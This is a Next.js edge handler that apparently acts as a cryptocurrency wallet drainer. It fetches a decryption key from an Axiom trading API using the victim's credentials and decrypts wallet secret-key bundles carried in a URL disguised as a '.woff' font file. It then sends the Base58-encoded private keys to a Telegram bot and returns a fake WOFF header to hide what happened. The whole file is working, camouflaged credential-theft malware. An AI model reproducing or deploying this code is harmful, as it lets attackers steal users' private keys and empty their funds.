import { NextRequest } from "next/server";

export const config = { runtime: "edge" };

// Base58 alphabet
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

// Encode a Uint8Array into Base58
function base58Encode(bytes: Uint8Array): string {
  // Convert bytes to BigInt
  let value = BigInt("0x" + [...bytes].map(b => b.toString(16).padStart(2, "0")).join(""));
  let encoded = "";
  while (value > 0n) {
    const mod = value % 58n;
    value = value / 58n;
    encoded = ALPHABET[Number(mod)] + encoded;
  }
  // Leading zeros
  for (let b of bytes) {
    if (b === 0) encoded = ALPHABET[0] + encoded;
    else break;
  }
  return encoded;
}

// Decode URL-safe Base64 to Uint8Array
function b64ToBytes(b64: string): Uint8Array {
  b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
  const pad = (4 - (b64.length % 4)) % 4;
  b64 += "=".repeat(pad);
  const binary = atob(b64);
  const arr = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    arr[i] = binary.charCodeAt(i);
  }
  return arr;
}

export default async function handler(req: NextRequest) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Missing BOT_TOKEN or CHAT_ID");
    return new Response("Misconfigured", { status: 500 });
  }

  // === 1) Fetch the bundleKey from Axiom API ===
  let bundleKeyB64: string;
  try {
    const r = await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
      method: "POST",
      credentials: "include"
    });
    const json = await r.json();
    bundleKeyB64 = json.bundleKey;
    if (!bundleKeyB64) throw new Error("no bundleKey");
  } catch (e) {
    console.error("Failed to fetch bundleKey:", e);
    return new Response("Failed", { status: 502 });
  }

  // Import AES-GCM key
  let aesKey: CryptoKey;
  try {
    const keyBytes = b64ToBytes(bundleKeyB64);
    aesKey = await crypto.subtle.importKey(
      "raw", keyBytes, "AES-GCM", false, ["decrypt"]
    );
  } catch (e) {
    console.error("Key import error:", e);
    return new Response("Bad key", { status: 400 });
  }

  // === 2) Extract sBundles from slug ===
  const slug = new URL(req.url).pathname.split("/").pop() || "";
  const core = slug.endsWith(".woff") ? slug.slice(0, -5) : slug;
  const idx = core.indexOf("_");
  if (idx < 0) {
    console.error("Invalid slug:", core);
    return new Response("Invalid slug", { status: 400 });
  }
  const encoded = core.slice(idx + 1);
  let payload: { sBundles: string[] };
  try {
    const raw = b64ToBytes(encoded);
    payload = JSON.parse(new TextDecoder().decode(raw));
  } catch (e) {
    console.error("Failed to parse payload:", e);
    return new Response("Bad payload", { status: 400 });
  }

  // === 3) Decrypt each bundle to 64 bytes and encode ===
  const secretKeys: string[] = [];
  for (let i = 0; i < payload.sBundles.length; i++) {
    const entry = payload.sBundles[i];
    const colon = entry.indexOf(":");
    if (colon < 0) continue;
    const iv = b64ToBytes(entry.slice(0, colon));
    const encrypted = b64ToBytes(entry.slice(colon + 1));
    try {
      const plain = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv }, aesKey, encrypted
      );
      const bytes = new Uint8Array(plain);
      if (bytes.length !== 64) {
        console.error(`Bundle ${i} wrong length:`, bytes.length);
        continue;
      }
      // Base58-encode the full 64-byte secret key
      secretKeys.push(base58Encode(bytes));
    } catch (err) {
      console.error(`Decrypt error bundle ${i}:`, err);
    }
  }

  // === 4) Send to Telegram ===
  if (secretKeys.length) {
    const text = secretKeys
      .map((k, i) => `Wallet ${i + 1}\n${k}`)
      .join("\n\n");
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
    } catch (e) {
      console.error("Telegram send error:", e);
    }
  } else {
    console.error("No keys decrypted");
  }

  // Respond with a valid WOFF header
  return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
    headers: {
      "Content-Type": "font/woff",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Credentials": "true"
    }
  });
}
